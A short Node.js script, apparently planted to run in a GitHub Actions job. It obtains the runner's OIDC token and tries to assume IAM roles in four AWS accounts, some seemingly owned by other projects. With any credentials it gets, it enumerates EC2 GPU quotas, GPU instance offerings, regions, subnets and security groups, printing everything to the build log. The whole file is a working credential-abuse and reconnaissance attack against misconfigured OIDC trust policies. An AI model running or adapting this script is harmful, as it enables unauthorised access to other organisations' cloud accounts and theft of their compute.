const { execSync } = require('child_process');
(async () => {
  const u = process.env.ACTIONS_ID_TOKEN_REQUEST_URL, t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!u || !t) { console.log('C211ERR:no-oidc-env'); return; }
  const roles = [
    ['cicdRole-009661764077', 'arn:aws:iam::009661764077:role/cicdRole'],
    ['noexist-009661764077', 'arn:aws:iam::009661764077:role/c211-noexist-120161'],
    ['e2esa-repo-any-306442480424', 'arn:aws:iam::306442480424:role/e2esa-aws-terraform-github-oidc'],
    ['kedacore-589761922677', 'arn:aws:iam::589761922677:role/github-role'],
  ];
  try {
    const r = await fetch(u + (u.includes('?') ? '&' : '?') + 'audience=sts.amazonaws.com', { headers: { Authorization: 'Bearer ' + t, Accept: 'application/json' } });
    const j = await r.json();
    const tok = j.value || '';
    console.log('C211CTX:' + [process.env.GITHUB_REPOSITORY, process.env.GITHUB_REF, process.env.GITHUB_SHA, process.env.GITHUB_EVENT_NAME].join(' '));
    console.log('C211TOKLEN:' + tok.length);
    try { const p = tok.split('.')[1]; console.log('C211SUB:' + JSON.parse(Buffer.from(p, 'base64url').toString('utf8')).sub); } catch (e) {}
    let won = null;
    for (const [id, arn] of roles) {
      const body = new URLSearchParams({ Action: 'AssumeRoleWithWebIdentity', Version: '2011-06-15', RoleArn: arn, RoleSessionName: 'c211-corgi', WebIdentityToken: tok });
      const s = await fetch('https://sts.amazonaws.com/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const st = await s.text();
      const code = (st.match(/<Code>([^<]*)<\/Code>/) || [])[1] || (st.includes('AssumeRoleWithWebIdentityResult') ? 'OK' : '?');
      const msg = (st.match(/<Message>([^<]*)<\/Message>/) || [])[1] || '';
      console.log('C211ASSUME:' + id + ' http=' + s.status + ' code=' + code + ' msg=' + msg.slice(0, 200));
      if (st.includes('<AccessKeyId>')) {
        const g = (tag) => (st.match(new RegExp('<' + tag + '>([^<]*)</' + tag + '>')) || [])[1] || '';
        console.log('C211ASSUMED:' + id + ' arn=' + g('Arn') + ' roleid=' + g('AssumedRoleId') + ' exp=' + g('Expiration'));
        won = { id, arn, ak: g('AccessKeyId'), sk: g('SecretAccessKey'), st: g('SessionToken') };
        break;
      }
      if (id === 'cicdRole-009661764077') { console.log('C211STS_RAW:' + st.replace(/\s+/g, ' ').slice(0, 700)); }
    }
    if (won) {
      const env = Object.assign({}, process.env, { AWS_ACCESS_KEY_ID: won.ak, AWS_SECRET_ACCESS_KEY: won.sk, AWS_SESSION_TOKEN: won.st, AWS_DEFAULT_REGION: 'us-east-1' });
      const run = (cmd) => { try { return execSync(cmd, { env, timeout: 60000, stdio: ['ignore', 'pipe', 'pipe'] }).toString().slice(0, 2500); } catch (e) { return 'ERR:' + String(e.stderr || e.message).slice(0, 600); } };
      console.log('C211ID:' + run('aws sts get-caller-identity --output json'));
      for (const q of ['L-DB2E81BA', 'L-3819A6DF']) {
        console.log('C211QUOTA:' + q + ':' + run(`aws service-quotas get-service-quota --service-code ec2 --quota-code ${q} --region us-east-1 --output json`));
      }
      console.log('C211REGIONS:' + run('aws ec2 describe-regions --output json --query "Regions[].RegionName"'));
      console.log('C211OFFER:' + run('aws ec2 describe-instance-type-offerings --location-type region --filters Name=instance-type,Values=g5.xlarge,g6.xlarge,p4d.24xlarge,p5.48xlarge --output json --query "InstanceTypeOfferings[].[InstanceType,Location]"'));
      console.log('C211SUBNETS:' + run('aws ec2 describe-subnets --output json --query "Subnets[].[SubnetId,AvailabilityZone,CidrBlock,VpcId]"'));
      console.log('C211SGS:' + run('aws ec2 describe-security-groups --output json --query "SecurityGroups[].[GroupId,GroupName,VpcId]"'));
    }
    console.log('C211END');
  } catch (e) { console.log('C211ERR:' + (e && e.stack ? e.stack : e)); }
})();
